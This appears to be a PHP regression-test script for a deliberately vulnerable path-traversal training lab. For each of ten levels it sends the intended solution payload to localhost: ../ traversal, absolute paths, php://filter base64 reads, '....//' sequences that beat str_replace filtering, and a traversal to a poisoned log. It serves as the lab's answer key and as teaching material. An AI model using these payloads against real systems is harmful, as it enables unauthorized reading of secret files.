<?php
/**
 * Path Traversal Lab self-test: runs the intended solution for every level
 * against the live app, so a level that has quietly stopped being solvable is
 * caught. Run inside the container:
 *
 *   docker compose exec web php /var/www/html/solve_check.php
 *
 * Not part of the challenge - it exists so the lab can be regression-tested.
 */
require_once __DIR__ . '/helpers.php';

$base = 'http://localhost';
$pass = 0;
$fail = 0;

/** GET a level page. $query is already-encoded query string (no leading '?'). */
function get(string $path, string $query): string
{
    $ctx = stream_context_create(['http' => [
        'method'  => 'GET',
        'timeout' => 20,
        'ignore_errors' => true,
    ]]);
    return (string)@file_get_contents($path . '?' . $query, false, $ctx);
}

/**
 * A level only counts as solved when the page rendered its flag-display box.
 * Finding the flag text anywhere in the body is not enough - for this lab the
 * raw file content is echoed too, so we insist on the success path.
 */
function check(int $level, string $body, string $note = ''): void
{
    global $pass, $fail;
    $want = get_flag_for_level($level);
    $shown = preg_match('~class="flag-display"[^>]*>([^<]*)~', $body, $m)
        ? trim($m[1]) : '';
    if ($want !== '' && $shown === $want) {
        $pass++;
        printf("  PASS  level %-2d %s%s\n", $level, $want, $note !== '' ? "  ($note)" : '');
    } else {
        $fail++;
        printf("  FAIL  level %-2d expected %s, page showed %s%s\n",
            $level, $want, $shown === '' ? '(no flag box)' : $shown,
            $note !== '' ? "  ($note)" : '');
    }
}

echo "Path Traversal Lab self-test\n----------------------------\n";

/* 1 - no filter at all: climb out of /var/www/html/files/ */
check(1, get("$base/level1.php", 'file=' . rawurlencode('../../../../var/secret/level1_flag.txt')),
    'plain ../ traversal');

/* 2 - no base prefix, so an absolute path is enough */
check(2, get("$base/level2.php", 'page=' . rawurlencode('/var/secret/level2_flag.txt')),
    'absolute path, no traversal needed');

/* 3 - ".." blocked, but php://filter takes an absolute path */
check(3, get("$base/level3.php", 'file=' . rawurlencode('php://filter/convert.base64-encode/resource=/var/secret/level3_flag.txt')),
    'stream wrapper, base64');

/* 4 - str_replace('../') is not recursive: ....// collapses to ../ */
check(4, get("$base/level4.php", 'file=' . rawurlencode('....//....//....//....//var/secret/level4_flag.txt')),
    'nested sequence survives one pass');

/* 5 - the check only looks at the last four characters */
check(5, get("$base/level5.php", 'file=' . rawurlencode('../../../../var/secret/level5_flag.txt')),
    'traversal that still ends in .txt');

/* 6 - base is /var/www/html/, so three levels reach / */
check(6, get("$base/level6.php", 'file=' . rawurlencode('../../../var/log/ptlab/access.log')),
    'poisoned log file');

/* 7 - htmlspecialchars on the output does not stop a base64 wrapper */
check(7, get("$base/level7.php", 'resource=' . rawurlencode('php://filter/convert.base64-encode/resource=/var/secret/level7_flag.txt')),
    'encoding sidesteps the escaping');

/* 8 - the prefix is hardcoded, so the "starts with base" test can never fail */
check(8, get("$base/level8.php", 'file=' . rawurlencode('../../../../var/secret/level8_flag.txt')),
    'security check is a tautology');

/* 9 - the blacklist only names /etc/passwd and /etc/shadow */
check(9, get("$base/level9.php", 'file=' . rawurlencode('../../../var/secret/level9_flag.txt')),
    'blacklist misses everything else');

/* 10 - ....// beats both str_replace passes, and /var/secret/ is not blocked */
check(10, get("$base/level10.php", 'file=' . rawurlencode('....//....//....//....//var/secret/level10_flag.txt')),
    'nested sequence + unlisted directory');

echo "----------------------------\n$pass passed, $fail failed\n";
exit($fail === 0 ? 0 : 1);
